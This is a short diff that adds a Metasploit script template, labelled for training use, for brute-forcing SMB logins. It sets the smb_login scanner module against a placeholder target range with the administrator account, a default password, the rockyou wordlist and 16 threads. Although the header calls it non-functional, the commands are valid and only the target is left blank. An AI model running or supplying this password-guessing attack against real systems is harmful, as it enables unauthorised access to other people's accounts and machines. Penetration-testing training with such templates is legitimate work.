@@ -1,0 +1,10 @@
+# SMB Brute Force Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/smb/smb_login
+set RHOSTS <TARGET_RANGE>
+set SMBUser administrator
+set SMBPass password123
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set THREADS 16
+run
